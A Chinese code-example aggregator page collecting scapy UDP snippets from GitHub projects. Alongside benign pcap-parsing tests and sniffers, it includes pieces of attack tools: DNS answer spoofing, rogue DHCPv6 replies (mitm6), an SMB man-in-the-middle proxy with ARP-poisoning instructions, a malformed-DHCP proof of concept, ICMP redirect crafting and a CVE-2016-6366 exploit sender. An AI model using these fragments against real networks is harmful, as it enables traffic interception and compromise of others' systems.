@@ -1,0 +1,705 @@
+示例1: test_single_udp_packet
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def test_single_udp_packet():
+
+    packets = [
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / UDP(sport=80, dport=5355)
+    ]
+
+    events = list(packets_to_datasource_events(packets).events())
+    assert len(events) == 1
+
+    assert events[0]["src_mac"] == "ab:ab:ab:ab:ab:ab"
+    assert events[0]["dst_mac"] == "12:12:12:12:12:12"
+    assert events[0]["src_ip"] == "127.0.0.1"
+    assert events[0]["dst_ip"] == "192.168.1.1"
+    assert events[0]["sport"] == 80
+    assert events[0]["dport"] == 5355
+    assert events[0]["event_type"] == "UDP" 
+开发者ID:yampelo，项目名称:beagle，代码行数:20，代码来源:test_pcap.py
+
+
+
+ 
+示例2: test_single_dns_resp_packet
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def test_single_dns_resp_packet():
+
+    packets = [
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / UDP(sport=80, dport=53)
+        / DNS(rd=1, qd=DNSQR(qtype="A", qname="google.com"), an=DNSRR(rdata="123.0.0.1"))
+    ]
+
+    events = list(packets_to_datasource_events(packets).events())
+    assert len(events) == 1
+
+    assert events[0]["src_mac"] == "ab:ab:ab:ab:ab:ab"
+    assert events[0]["dst_mac"] == "12:12:12:12:12:12"
+    assert events[0]["src_ip"] == "127.0.0.1"
+    assert events[0]["dst_ip"] == "192.168.1.1"
+    assert events[0]["sport"] == 80
+    assert events[0]["dport"] == 53
+    assert events[0]["qname"] == "google.com."
+    assert events[0]["qanswer"] == "123.0.0.1"
+    assert events[0]["qtype"] == "A"
+    assert events[0]["event_type"] == "DNS" 
+开发者ID:yampelo，项目名称:beagle，代码行数:24，代码来源:test_pcap.py
+
+
+示例3: test_single_dns_query_packet
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def test_single_dns_query_packet():
+
+    packets = [
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / UDP(sport=80, dport=53)
+        / DNS(rd=1, qd=DNSQR(qtype="A", qname="google.com"))
+    ]
+
+    events = list(packets_to_datasource_events(packets).events())
+    assert len(events) == 1
+
+    assert events[0]["src_mac"] == "ab:ab:ab:ab:ab:ab"
+    assert events[0]["dst_mac"] == "12:12:12:12:12:12"
+    assert events[0]["src_ip"] == "127.0.0.1"
+    assert events[0]["dst_ip"] == "192.168.1.1"
+    assert events[0]["sport"] == 80
+    assert events[0]["dport"] == 53
+    assert events[0]["qname"] == "google.com."
+    assert events[0]["qtype"] == "A"
+
+    assert events[0]["event_type"] == "DNS" 
+开发者ID:yampelo，项目名称:beagle，代码行数:24，代码来源:test_pcap.py
+
+
+
+ 
+示例4: test_multiple_packets
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def test_multiple_packets():
+    packets = [
+        # HTTP Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=12345, dport=80)
+        / HTTP()
+        / HTTPRequest(Method="GET", Path="/foo", Host="https://google.com"),
+        # DNS Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / UDP(sport=80, dport=53)
+        / DNS(rd=1, qd=DNSQR(qtype="A", qname="google.com"), an=DNSRR(rdata="123.0.0.1")),
+        # TCP Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=80, dport=5355),
+    ]
+
+    events = list(packets_to_datasource_events(packets).events())
+    assert len(events) == 3
+
+    assert [e["event_type"] for e in events] == ["HTTPRequest", "DNS", "TCP"] 
+开发者ID:yampelo，项目名称:beagle，代码行数:25，代码来源:test_pcap.py
+
+
+示例5: __init__
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def __init__(self, client_ip = "", server_ip = "", client_port = 0, server_port = 0, protocol = "TCP", interface = ""):
+        self.client_ip 		= client_ip
+        self.server_ip 		= server_ip
+        self.client_port 	= client_port
+        self.server_port 	= server_port
+        self.protocol 		= protocol.lower()
+        self.interface 		= interface
+
+    # This returns just the source address & port in a string format
+    # so that it can be hashed and tied back to the connectionManager.
+    # The protocol, source address, and port are the only shared pieces of information
+    # that both the MiTMModule socket and nfqueue intercept have access to, so
+    # nfqueue hashes this info together and uses that hash as the key in the 
+    # connectionMnaager. Once the MiTMModule recieves the intercepted connection,
+    # it will hash the proto/source ip/port to pull back the whole Connection
+    # object from the connectionManager - and thus - have the destination ip and port
+    # to then behave like a fully transparent TCP/UDP MiTM server. 
+开发者ID:quickbreach，项目名称:SMBetray，代码行数:19，代码来源:ebcLib.py
+
+
+
+ 
+示例6: spoof_packet
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def spoof_packet(packet):
+    options = get_arguments()
+    dns_packet = scapy.IP(packet.get_payload())
+    if dns_packet.haslayer(scapy.DNSRR):
+        qname = dns_packet[scapy.DNSQR].qname
+        if options.website in qname:
+            dns_responce = scapy.DNSRR(rrname=qname, rdata=options.ip)
+            dns_packet[scapy.DNS].an = dns_responce
+            dns_packet[scapy.DNS].ancount = 1
+
+            del dns_packet[scapy.IP].len
+            del dns_packet[scapy.IP].chksum
+            del dns_packet[scapy.UDP].len
+            del dns_packet[scapy.UDP].chksum
+
+            packet.set_payload(str(dns_packet))
+    packet.accept() 
+开发者ID:mpostument，项目名称:hacking_tools，代码行数:19，代码来源:dns_spoof.py
+
+
+示例7: build_dhcp
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def build_dhcp(pdiscover):
+    req_addr = None
+    server_id = None
+    vendor_class = None
+    try:
+        for m in pdiscover[DHCP].options:
+            n, v = m
+            if n == "requested_addr":
+                req_addr = v
+            elif n == "server_id":
+                server_id = v
+            elif n == "vendor_class_id":
+                vendor_class = v
+    except:
+        pass
+    print "[i] --> received vendor_class = %s" % vendor_class
+    e_dst = pdiscover[Ether].src
+
+    p = Ether(dst=e_dst) / IP(src=server_id, dst=req_addr or "0.0.0.0") / UDP(sport=67, dport=68, len=9000)
+    p[UDP].chksum = get_udp_checksum(p)
+    return p 
+开发者ID:tintinweb，项目名称:pub，代码行数:23，代码来源:poc.py
+
+
+示例8: test_reflector_sniffer_pos
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def test_reflector_sniffer_pos(self):
+
+        args = ["8.8.8.8", "-I", "0"]
+        options = amplifier_parse_args(args)
+        sniffer = ReflectorSniffer(options)
+
+        packet = IP() / UDP()
+        result = sniffer.filter_action(packet)
+        self.assertMultiLineEqual(
+            result,
+            "TARGET: 8.8.8.8 | TO TARGET packets: 0, bytes: 0 | FROM "
+            "TARGET packets: 0, bytes: 0 | AMPLIF FACTOR: 0.00%",
+        )
+
+        packet = IP(src="1.1.1.1", dst="8.8.8.8") / UDP(dport=1000, sport=2000)
+        result = sniffer.filter_action(packet)
+        self.assertIn("-100.00%", result)
+        self.assertIn(" 28 ", result)
+
+        packet = IP(src="8.8.8.8", dst="1.1.1.1") / UDP(dport=1000, sport=2000)
+        result = sniffer.filter_action(packet)
+        self.assertIn(" 28 ", result)
+        self.assertIn(" 0.00%", result) 
+开发者ID:Samsung，项目名称:cotopaxi，代码行数:25，代码来源:test_amplifier_detector.py
+
+
+示例9: sr1_file
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def sr1_file(test_params, test_filename, display_packet=False):
+    """Read test message from given file, sends this message to server and parses response."""
+    with open(test_filename, "rb") as file_handle:
+        test_packet = file_handle.read()
+    if display_packet:
+        # print("Protocol: {}".format(proto_mapping(test_params.protocol)))
+        try:
+            if test_params.protocol in PROTOCOL_TESTERS:
+                out_packet = PROTOCOL_TESTERS[test_params.protocol].request_parser(
+                    test_packet
+                )
+            out_packet.show()
+            print_verbose(test_params, 60 * "-")
+        except (TypeError, struct.error, RuntimeError, ValueError, Scapy_Exception):
+            pass
+    test_result = None
+    if test_params.protocol in [Protocol.SSDP]:
+        test_result = ssdp_send_query(test_params, test_packet)
+    elif test_params.protocol in protocols_using(UDP):
+        test_result = udp_sr1(test_params, test_packet)
+    elif test_params.protocol in protocols_using(TCP):
+        test_result = tcp_sr1(test_params, test_packet)
+    return test_result 
+开发者ID:Samsung，项目名称:cotopaxi，代码行数:25，代码来源:cotopaxi_tester.py
+
+
+示例10: proto_mapping_request
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def proto_mapping_request(protocol):
+    """Provide mapping of enum values to implementation classes."""
+    return {
+        Protocol.ALL: IP,
+        Protocol.UDP: UDP,
+        Protocol.TCP: TCP,
+        Protocol.CoAP: CoAP,
+        Protocol.mDNS: DNS,
+        Protocol.MQTT: MQTT,
+        Protocol.DTLS: DTLS,
+        Protocol.QUIC: UDP,
+        Protocol.RTSP: HTTPRequest,
+        Protocol.SSDP: HTTPRequest,
+        Protocol.HTCPCP: HTTPRequest,
+        Protocol.HTTP: HTTPRequest,
+    }[protocol] 
+开发者ID:Samsung，项目名称:cotopaxi，代码行数:18，代码来源:common_utils.py
+
+
+示例11: send_dhcp_advertise
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def send_dhcp_advertise(p, basep, target):
+    global ipv6noaddrc
+    resp = Ether(dst=basep.src)/IPv6(src=config.selfaddr, dst=basep[IPv6].src)/UDP(sport=547, dport=546) #base packet
+    resp /= DHCP6_Advertise(trid=p.trid)
+    #resp /= DHCP6OptPref(prefval = 255)
+    resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
+    resp /= DHCP6OptServerId(duid=config.selfduid)
+    resp /= DHCP6OptDNSServers(dnsservers=[config.selfaddr])
+    if config.localdomain:
+        resp /= DHCP6OptDNSDomains(dnsdomains=[config.localdomain])
+    if target.ipv4 != '':
+        addr = config.ipv6prefix + target.ipv4.replace('.', ':')
+    else:
+        addr = config.ipv6prefix + '%d:%d' % (config.ipv6noaddr, config.ipv6noaddrc)
+        config.ipv6noaddrc += 1
+    opt = DHCP6OptIAAddress(preflft=300, validlft=300, addr=addr)
+    resp /= DHCP6OptIA_NA(ianaopts=[opt], T1=200, T2=250, iaid=p[DHCP6OptIA_NA].iaid)
+    sendp(resp, iface=config.default_if, verbose=False) 
+开发者ID:fox-it，项目名称:mitm6，代码行数:20，代码来源:mitm6.py
+
+
+示例12: send_dhcp_reply
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def send_dhcp_reply(p, basep):
+    resp = Ether(dst=basep.src)/IPv6(src=config.selfaddr, dst=basep[IPv6].src)/UDP(sport=547, dport=546) #base packet
+    resp /= DHCP6_Reply(trid=p.trid)
+    #resp /= DHCP6OptPref(prefval = 255)
+    resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
+    resp /= DHCP6OptServerId(duid=config.selfduid)
+    resp /= DHCP6OptDNSServers(dnsservers=[config.selfaddr])
+    if config.localdomain:
+        resp /= DHCP6OptDNSDomains(dnsdomains=[config.localdomain])
+    try:
+        opt = p[DHCP6OptIAAddress]
+        resp /= DHCP6OptIA_NA(ianaopts=[opt], T1=200, T2=250, iaid=p[DHCP6OptIA_NA].iaid)
+        sendp(resp, iface=config.default_if, verbose=False)
+    except IndexError:
+        # Some hosts don't send back this layer for some reason, ignore those
+        if config.debug or config.verbose:
+            print('Ignoring DHCPv6 packet from %s: Missing DHCP6OptIAAddress layer' % basep.src) 
+开发者ID:fox-it，项目名称:mitm6，代码行数:19，代码来源:mitm6.py
+
+
+示例13: get_kube_dns_ip_mac
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def get_kube_dns_ip_mac(self):
+        config = get_config()
+        kubedns_svc_ip = self.extract_nameserver_ip()
+
+        # getting actual pod ip of kube-dns service, by comparing the src mac of a dns response and arp scanning.
+        dns_info_res = srp1(
+            Ether() / IP(dst=kubedns_svc_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR()),
+            verbose=0,
+            timeout=config.network_timeout,
+        )
+        kubedns_pod_mac = dns_info_res.src
+        self_ip = dns_info_res[IP].dst
+
+        arp_responses, _ = srp(
+            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=f"{self_ip}/24"), timeout=config.network_timeout, verbose=0,
+        )
+        for _, response in arp_responses:
+            if response[Ether].src == kubedns_pod_mac:
+                return response[ARP].psrc, response.src 
+开发者ID:aquasecurity，项目名称:kube-hunter，代码行数:21，代码来源:dns.py
+
+
+示例14: find_imsi_from_pkt
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def find_imsi_from_pkt(p):
+    udpdata = bytes(p[UDP].payload)
+    find_imsi(udpdata) 
+开发者ID:Oros42，项目名称:IMSI-catcher，代码行数:5，代码来源:simple_IMSI-catcher.py
+
+
+示例15: __init__
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def __init__(self, dns_captured_cb):
+        self.name = "UDP traffic"
+        
+        self.dns_captured_cb = dns_captured_cb 
+开发者ID:turingsec，项目名称:marsnake，代码行数:6，代码来源:udp_traffic.py
+
+
+示例16: _sniff_start
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def _sniff_start(self,
+                     destination_mac_address: str,
+                     destination_ipv4_address: str,
+                     destination_ipv6_address: str,
+                     source_port: int = 53) -> None:
+        """
+        Sniff DNS answers
+        :param destination_mac_address: Destination MAC address in DNS answer (most likely this is MAC address on your network interface)
+        :param destination_ipv4_address: Destination IPv4 address in DNS answer (most likely this is IPv4 address on your network interface)
+        :param destination_ipv6_address: Destination IPv6 address in DNS answer (most likely this is IPv6 address on your network interface)
+        :param source_port: Source UDP port in DNS answer (default: 53 - default port for DNS servers)
+        :return: None
+        """
+        while self.base.get_process_pid('tshark') != -1:
+            kill(self.base.get_process_pid('tshark'), SIGINT)
+            sleep(1)
+        try:
+            remove(RawDnsResolver.tshark_pcap_filename)
+        except FileNotFoundError:
+            pass
+        tshark_command: str = 'tshark -i ' + self.network_interface + \
+                              ' -f "ether dst ' + destination_mac_address + \
+                              ' and ip dst ' + destination_ipv4_address + \
+                              ' and udp src port ' + str(source_port) + \
+                              '" -B 65535 -w ' + RawDnsResolver.tshark_pcap_filename + \
+                              ' 1>/dev/null 2>&1'
+        self.tshark_process = Popen(tshark_command, shell=True)
+        sleep(0.5)
+        while self.base.get_process_pid('tshark') == -1:
+            input(self.base.c_warning + 'Start tshark: ' + self.base.info_text(tshark_command) +
+                  ' and press Enter to continue ...')
+            sleep(1)
+    # endregion
+
+    # region Check tshark 
+开发者ID:raw-packet，项目名称:raw-packet，代码行数:37，代码来源:dns_resolver.py
+
+
+示例17: test_from_datasources
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def test_from_datasources():
+    packets_1 = [
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=12345, dport=80)
+        / HTTP()
+        / HTTPRequest(Method="GET", Path="/foo", Host="https://google.com")
+    ]
+
+    packets_2 = [
+        # HTTP Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=12345, dport=80)
+        / HTTP()
+        / HTTPRequest(Method="GET", Path="/foo", Host="https://google.com"),
+        # DNS Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / UDP(sport=80, dport=53)
+        / DNS(rd=1, qd=DNSQR(qtype="A", qname="google.com"), an=DNSRR(rdata="123.0.0.1")),
+        # TCP Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=80, dport=5355),
+    ]
+
+    nx = NetworkX.from_datasources(
+        [packets_to_datasource_events(packets) for packets in [packets_1, packets_2]]
+    )
+
+    # Make the graph
+    nx.graph()
+
+    assert not nx.is_empty() 
+开发者ID:yampelo，项目名称:beagle，代码行数:37，代码来源:test_networkx.py
+
+
+示例18: send
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def send(self, packet):
+        original_packet = IP(dst=self.target_ip,src=self.return_ip)/UDP(dport=self.target_port,sport=self.return_port)/packet
+        if self.verbose > 1:
+            print "Original packet:"
+            original_packet.show()
+        hexdump(str(original_packet))
+       
+        fragments = fragment(original_packet, fragsize = self.fragment_size)
+        try:
+            i = 1
+            for frag in fragments:
+                if self.verbose > 1:
+                    print "Fragment %d of %d:" % (i, len(fragments))
+                    frag.show()
+                frag = str(frag)
+                length = struct.pack(">I", len(frag))
+
+                if not self.sock:
+                    print '[+] connecting ...'
+                    self.sock = self.create()
+                   
+                print '[+] sending part %d of %d now..' % (i, len(fragments))
+                hexdump(frag)
+                if self.log:
+                    self.log.packet('sending fragment %d of %d' % (i, len(fragments)), frag)
+                self.sock.send(length)
+                self.sock.send(frag)
+                if self.log:
+                    self.log('sent fragment %d of %d' % (i, len(fragments)))
+                i += 1
+                
+                if self.raw_send:
+
+                    if self.log:
+                        self.log('forcing a new connection due to raw_send flag')
+                    self.close()
+               
+        except KeyboardInterrupt,e:
+            print "[-] keyboard interrupt while connecting/sending to redirector"
+            raise KeyboardInterrupt,e 
+开发者ID:RiskSense-Ops，项目名称:CVE-2016-6366，代码行数:42，代码来源:sploit.py
+
+
+示例19: __str__
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def __str__(self):
+        return "[" + str(self.protocol.upper()) + "] " + str(self.client_ip) + ":" + str(self.client_port) + " -> " + str(self.server_ip) + ":" + str(self.server_port)
+
+# MiTMServer - A fully modular and transparent UDP/TCP proxy server that leverages nfqueue and iptables to run mitm attacks
+#	Usage:
+#	0. Setup a bi-directional arp-cache poisoning attack with ip_forwarding enabled on your machine (Pro tip: run "sysctl net.ipv4.ip_forward=1")
+#	1. Declare an instance of a MiTMModule
+#	2. Declare an instance of a MiTMServer as 'MiTMServer(desired_port, either "TCP" or "UDP", MiTMModule_instance, T/F for newInstance)'
+#	3. MiTMServer.start() -- you can run multiple servers with different ports in multiple threads
+# 	4. Profit 
+开发者ID:quickbreach，项目名称:SMBetray，代码行数:12，代码来源:ebcLib.py
+
+
+示例20: nfqueueBinder
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def nfqueueBinder(self):
+        self.logger.debug("[ebcLib.py] Binding nfqueue...")
+        nfqueue = netfilterqueue.NetfilterQueue()
+        nfqueue.bind(self.nfqueueNum, self.nfqueueHandler)
+        nfqueue.run()
+
+    # This listens for new requests and handles them
+    # TCP - forks them off to their own threads
+    # UDP - directly calls the mitmInstance since it's a "stateless" protocol 
+开发者ID:quickbreach，项目名称:SMBetray，代码行数:11，代码来源:ebcLib.py
+
+
+示例21: listen
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def listen(self):
+        try:
+            # Open up the firewall
+            self.openFirewall()
+            # Start up nfqueue bind
+            self.nfqueueThread.daemon = True
+            self.nfqueueThread.start()
+            # Start up the TCP intercept server
+            if(self.protocol == "TCP"):
+                self.sock.listen(5)
+                self.logger.info("[ebcLib.py] Started " + self.protocol + "/" + str(self.port) + " intercept server")
+                while True:
+                    client, address = self.sock.accept()
+                    client.settimeout(60)
+                    self.myThreads.append(threading.Thread(target = self.victimHandler, args = (client, address)))
+                    self.myThreads[-1].daemon = True
+                    self.myThreads[-1].start()
+            '''
+            # TODO: Add UDP support
+            if(self.protocol == "UDP"):
+                self.logger.info("Starting " + self.protocol + "/" + str(self.port) + " intercept server...")
+                while True:
+                    data, address = self.sock.recvfrom()
+                    # Check if nfqueue was able to grab the important info
+                    nc = Connection(str(address[0]), '', int(address[1]), '', self.protocol, self.interface) 
+                    key = hash(str(nc.getMark()))
+                    if key not in self.connectionManager:
+                        self.logger.debug("Connection was not found in nfqueue populated dict")
+                        continue
+                    resp = self.mitmInstance.run_mitm(data)
+                    self.sock.sendto(resp, (address[0], address[1]))
+            '''	
+        except KeyboardInterrupt:
+            self.logger.debug("[ebcLib.py] Shutting down......")
+            self.shutdown()
+            return
+        self.shutdown()
+        return
+    
+    # This is the thread in which a hijacked TCP/UDP connection is
+    # handled in its own thread 
+开发者ID:quickbreach，项目名称:SMBetray，代码行数:43，代码来源:ebcLib.py
+
+
+示例22: build_icmp
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def build_icmp(self):
+        pkt = IP(src=self.gateway, dst=self.target)/ICMP(type=5, code=1, gw=self.ip_address) /\
+              IP(src=self.target, dst=self.gateway)/UDP()
+
+        return pkt 
+开发者ID:paranoidninja，项目名称:piSociEty，代码行数:7，代码来源:ICMP.py
+
+
+示例23: get_udp_checksum
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def get_udp_checksum(p):
+    dummy = p[IP].copy()
+    dummy[IP].version = 0
+    dummy[IP].ihl = 0
+    dummy[IP].tos = 0
+    dummy[IP].len = p[UDP].len
+    dummy[IP].id = 0
+    dummy[IP].ttl = 0
+    dummy[IP].frag = 0
+    dummy[IP].chksum = 0x0
+    dummy[UDP].chksum = 0x0
+    chksum = checksum(str(dummy))
+    print "[i] --> new checksum = %x" % chksum
+    return chksum 
+开发者ID:tintinweb，项目名称:pub，代码行数:16，代码来源:poc.py
+
+
+示例24: detect_dhcp
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def detect_dhcp(p):
+    print "[i] --> packet matched bpf"
+    if BOOTP not in p or p[UDP].sport != 68 or p[UDP].dport != 67:
+        print "[!] --> skipping unexpected packet"
+        #p.show()
+        return
+
+    print "[i] got DHCP request"
+    p.show()
+    print "[+] building malformed reply ..."
+    reply = build_dhcp(p)
+    reply.show()
+    print "[+] sending malformed reply ..."
+    sendp(reply, iface=conf.iface, verbose=True) 
+开发者ID:tintinweb，项目名称:pub，代码行数:16，代码来源:poc.py
+
+
+示例25: _packet_handler
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def _packet_handler(self, pkt):
+        try:
+            if pkt.haslayer(DHCP):
+                self._handle_dhcp(pkt)
+            elif pkt.haslayer(UDP) and pkt[UDP].dport == 1900:
+                self._handle_ssdp(pkt)
+        except Exception as e:
+            self.logger.error("Failed to handle packet")
+            self.logger.exception(e) 
+开发者ID:usableprivacy，项目名称:upribox，代码行数:11，代码来源:sniff_thread.py
+
+
+示例26: run
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def run(self):
+        while True:
+            send(IP(dst=self._DST) / UDP(sport=self._PORT, dport=self._PORT) / self._PAYLOAD, iface=self.interface)
+            time.sleep(self._SLEEP) 
+开发者ID:usableprivacy，项目名称:upribox，代码行数:6，代码来源:misc_thread.py
+
+
+示例27: send_packet
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def send_packet(protocol=None, src_ip=None, src_port=None, flags=None, dst_ip=None, dst_port=None, iface=None):
+    """Modify and send an IP packet."""
+    if protocol == 'tcp':
+        packet = IP(src=src_ip, dst=dst_ip)/TCP(flags=flags, sport=src_port, dport=dst_port)
+    elif protocol == 'udp':
+        if flags: raise Exception(" Flags are not supported for udp")
+        packet = IP(src=src_ip, dst=dst_ip)/UDP(sport=src_port, dport=dst_port)
+    else:
+        raise Exception("Unknown protocol %s" % protocol)
+
+    send(packet, iface=iface) 
+开发者ID:PacktPublishing，项目名称:Python-Network-Programming-Cookbook-Second-Edition，代码行数:13，代码来源:8_5_modify_ip_in_a_packet.py
+
+
+示例28: process
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import UDP [as 别名]
+def process(self, pkt):
+            if all(layer in pkt for layer in (scapy.Ether, scapy.IP, scapy.UDP, scapy.Raw)):
+                logger.debug(pkt.sprintf('%IP.src%: %Raw.load%'))
+
+                try:
+                    load = pkt.load.decode('utf-8')
+                except UnicodeDecodeError:
+                    return
+
+                m = re.search(self.flagpattern, load)
+                if m:
+                    self.question = m.group(0)
+                elif 'Yup' in load and self.question is not None:
+                    self.flag = self.question
+                    self.sniffer.stop() 
+开发者ID:nategraf，项目名称:Naumachia，代码行数:17，代码来源:middle.py
